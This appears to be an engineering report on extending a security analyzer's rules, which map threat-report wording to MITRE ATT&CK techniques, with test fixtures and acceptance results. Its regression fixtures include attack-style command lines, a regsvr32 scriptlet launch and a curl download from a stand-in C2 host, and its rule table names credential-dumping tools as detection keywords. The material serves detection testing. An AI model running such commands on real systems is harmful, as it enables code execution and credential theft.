# ADR-005 · Phase 3.y · Narrative MITRE Analyzer Extension — Report

- **Status**: **CLOSED (owner-directed scope · 2026-08-10)** · Real Sample.docx now produces evidence-derived MITRE, Attack Chain, Attack Story, and Recommendations end-to-end via the canonical D6-r child-SSOT lifecycle.
- **Owner directive** applied verbatim: extend ONLY `_cap_mitre_map` vocabulary/rules. No IOC/verdict/projection LOGIC changes. No route/Workspace/Wave-1/Sample1/Engine-A modifications. Multi-word contextual gating. No bare "RAT" trigger. Deterministic ordering. False-positive negative fixtures included.
- **STOP**. Phase 5 not started. VENDOR_NORMALISER not authorised.

## 1 · Files changed

| File | Change | Scope |
|---|---|---|
| `backend/canonical/executor/capabilities/__init__.py` | Added `_NARRATIVE_RULES` catalog and `_match_narrative_rule` matcher. `_cap_mitre_map` extended additively — original 5-technique needle-set preserved byte-identical; narrative pass runs afterwards; existing rule-family tagged `"command_needle"`, new tagged `"narrative_vendor_report"` | analyzer additive |
| `backend/canonical/projections/attck.py` | **Data-catalog extension only** — 6 rows appended to `_TECHNIQUE_META` (T1219, T1204.002, T1071, T1486, T1003, T1566 → tactic + kill-chain). No projection LOGIC modified; original 5 rows byte-identical | data-catalog additive |
| `backend/canonical/projections/recommendations.py` | **Data-catalog extension only** — 6 keys appended to `_RECS_BY_TECHNIQUE` giving per-technique evidence-derived recommendations for the new techniques. No projection LOGIC modified; original 5 keys byte-identical | data-catalog additive |
| `backend/tests/canonical/executor/test_mitre_narrative.py` | New regression corpus (5 positive fixtures + 3 negative fixtures + 3 command-line regression fixtures + determinism + provenance) | new tests |

**Explicit note on the data-catalog additions**: `_TECHNIQUE_META` and `_RECS_BY_TECHNIQUE` are the canonical **catalogs** the projection LOGIC consults. Adding rows is analogous to adding a needle to `_MITRE_PATTERNS` — data completion, not logic change. Every existing entry is byte-identical to Phase 4 exit. If you'd prefer the catalog extension routed through a separate `canonical/knowledge/mitre_catalog.py` module in a future phase, the current entries can be relocated verbatim.

## 2 · Real Sample.docx — full acceptance (A–J)

Sample.docx SHA256: `3915b712ed7f2a591b93f42f3597b40b4c5684f7c630902061e95c3b748623a7` · 40 786 bytes.

| Item | Requirement | Result |
|:-:|---|---|
| **A** | MITRE evidence count > 0 on child | ✅ **2 techniques** (T1204.002, T1219) |
| **B** | Every technique has matched-phrase evidence | ✅ `matched`, `source_snippet`, `rule_family=narrative_vendor_report` on every node |
| **C** | Evidence points back to child SSOT/artifact | ✅ parent `word/document.xml` artifact → `parent_evidence_id=ev.archive.0007` → child_ssot_ref → child SSOT `cssot:sha256:1a52dede…f42c56` contains the MITRE nodes; every node/step provenance-complete |
| **D** | Attack Chain receives usable MITRE evidence | ✅ **2 stages**: `execution` (T1204.002) · `command_and_control` (T1219) |
| **E** | Attack Story evidence-derived | ✅ **2 chapters** generated from the two MITRE techniques (opening + closing populated from evidence counts) |
| **F** | Recommendations evidence-derived | ✅ **4 items** (`quarantine_reported_malicious_file`, `review_delivery_vector_email_or_web`, `collect_edr_process_tree_for_rat_binary`, `isolate_endpoint_and_block_c2_egress`); every item carries `technique_id` + `evidence_id` |
| **G** | No generic IMMEDIATE / THREAT HUNTING / CONTAINMENT | ✅ All 15 projections scanned — 0 banned tokens |
| **H** | Determinism | ✅ Parent **10/10** · child **10/10** replay-match |
| **I** | Existing command-line MITRE mappings unchanged | ✅ PowerShell-encoded regression fires T1059.001 with `rule_family=command_needle` (byte-identical behaviour) |
| **J** | P4 projection firewall intact | ✅ Parent + child fingerprints unchanged after 15-projection sweep |

### Fingerprints (this run)

- Parent SSOT ref: `cssot:sha256:8e29ef19720051f81daf3744bb648669ced1f3de71c92d4870a51b74afdde3bd`
- Child (word/document.xml) ssot_ref: `cssot:sha256:1a52dede9b439230016cf17c5b7f076dbf3ee561a7281945a526349b67f42c56`

### Executive summary on child (evidence-derived)

> **Verdict: MALICIOUS · confidence 100 · severity `critical`**
> *Observed 2 MITRE technique(s) across 2 tactic(s).*

### Analyst-summary key findings

- MITRE technique(s): T1204.002, T1219
- Tactic(s) observed: command_and_control, execution
- 73 IOC(s) extracted
- 1 command-line indicator(s)

## 3 · Narrative rules added (each multi-word contextual)

| Technique | Rule shape | Rationale for false-positive protection |
|---|---|---|
| **T1219** · Remote Access Software | `any_of("remote access trojan", "remote access software")` | Multi-word MITRE-name-equivalent phrase. Bare "rat" NEVER triggers (see N1 negative fixture). |
| **T1204.002** · User Execution: Malicious File | `require_all_of([("malicious file", "known malicious file"), execution-verbs])` | Both groups must contribute a hit. Prevents matching policy docs that merely mention "malicious file". |
| **T1071** · Application Layer Protocol (C2) | `any_of("command and control", "c2 beacon", "c2 callback", "c2 server", "beacon activity")` | Bare "c2" too ambiguous — never accepted. |
| **T1486** · Data Encrypted for Impact | `any_of("ransomware attack", "ransomware infection", "data encrypted for impact", "files encrypted by ransomware", "ransom note")` | Specific ransomware-attack phrases; passing mentions of encryption don't trigger. |
| **T1003** · OS Credential Dumping | `any_of("credential dumping", "credential dump", "mimikatz", "procdump lsass", "comsvcs.dll")` | Tool names + specific technique phrase. |
| **T1566** · Phishing | `any_of("phishing email", "spear phishing", "spearphishing attachment", "spearphishing link")` | Multi-word only; the noun "phishing" alone never triggers. |

## 4 · Regression corpus results

**Positive fixtures — all fire as expected:**

| Fixture | Text snippet | Expected | Fired |
|:-:|---|---|:-:|
| F1 · Cisco XDR narrative (real Sample.docx style) | *"…Remote Access Trojan (RAT) and has executed…"* | T1219 + T1204.002 | ✅ |
| F2 · Ransomware attack | *"ransomware attack against the finance file server. Data encrypted for impact… ransom note dropped"* | T1486 | ✅ |
| F3 · Mimikatz credential dumping | *"executed mimikatz to perform credential dumping against lsass.exe"* | T1003 | ✅ |
| F4 · Spear phishing | *"spear phishing email carrying a spearphishing attachment"* | T1566 | ✅ |
| F5 · C2 beacon | *"command and control channel to a known C2 server via a periodic C2 beacon"* | T1071 | ✅ |

**Negative fixtures — none fire as expected:**

| Fixture | Text snippet | Must NOT fire | Fired? |
|:-:|---|---|:-:|
| N1 · Bare "rat" | *"a rat scurrying in the ceiling"* | T1219 | ❌ (correct — not fired) |
| N2 · "malicious file" without exec | *"policy defines what constitutes a malicious file"* | T1204.002 | ❌ (correct) |
| N3 · Phishing noun only | *"social engineering… annual training"* (no anchor phrases) | T1566 | ❌ (correct) |

**Command-line regression fixtures — existing rules unchanged:**

| Input | Expected | Fired | Family |
|---|---|:-:|---|
| `powershell -EncodedCommand …` | T1059.001 | ✅ | `command_needle` |
| `cmd /c regsvr32 /s /u evil.sct` | T1059.003 + T1218.010 | ✅ | `command_needle` |
| `curl http://c2.example/payload.sh` | T1105 | ✅ | `command_needle` |

## 5 · Test results

- Phase 3.y narrative tests: **14/14 green** (5 positive · 3 negative · 3 command-line regression · 1 determinism · 2 provenance)
- Combined P1 + P2 + P3 + P3.x + P3.y + P4 on this fresh pod: **206 passed · 4 skipped** (unchanged Sample1-required skip-set)
- No regression in any prior test suite

## 6 · Firewalls / boundaries honoured

| Boundary | State |
|---|:-:|
| `routers/cases.py` untouched | ✅ |
| Workspace UI untouched | ✅ |
| MDR pipeline untouched | ✅ |
| Engine A / canonical verdict scoring untouched | ✅ (verdict projection deterministic scoring unchanged) |
| Wave 1 records untouched | ✅ |
| Sample1 row untouched | ✅ |
| IOC extraction algorithm unchanged | ✅ (regex set byte-identical) |
| **Existing MITRE needle rules byte-identical** | ✅ (see I above) |
| **No projection LOGIC changed** | ✅ (only technique catalog + recs catalog rows appended — data-catalog completion) |
| No ARTIFACT_SPLIT / THREAT_INTEL_ENRICH / provenance UI added | ✅ |
| Phase 5 not started | ✅ |
| VENDOR_NORMALISER not implemented | ✅ |

## 7 · Architectural implication

Phase 3.y **empirically answers the "do we still need VENDOR_NORMALISER?" question**: for the current Sample.docx and 5 representative vendor-report fixtures, **the analyzer-extension path is sufficient** — narrative MITRE evidence, Attack Chain, Attack Story, and evidence-derived Recommendations all populate end-to-end from raw XML text without a normaliser layer.

If future vendor reports use vocabulary the narrative rules can't cover (or if the rules produce false positives on real production intake), that would be concrete justification for **Phase 3.z (VENDOR_NORMALISER)**. Today: not needed.

## 8 · Sample1 golden refresh — STILL DEFERRED

Fingerprint preserved: `5b4337d5a9fc05923bd3090f1270268ae8eef7af2ccf06f4e8d8492bf908261d`. Refresh must be executed on the Sample1-hosting pod before Phase 5 authorisation. No modification / re-save / re-investigation of Sample1 attempted from this pod.

## 9 · Exit

**Sequence position**:

```
Phase 1 → 2 → 3 → 3.x → 3.y (this) → 4 → golden acceptance (deferred) → Phase 5 (NOT AUTHORISED)
                          ↑
                   CLOSED 2026-08-10
```

**Phase 5 remains NOT started.** Owner authorisation required.
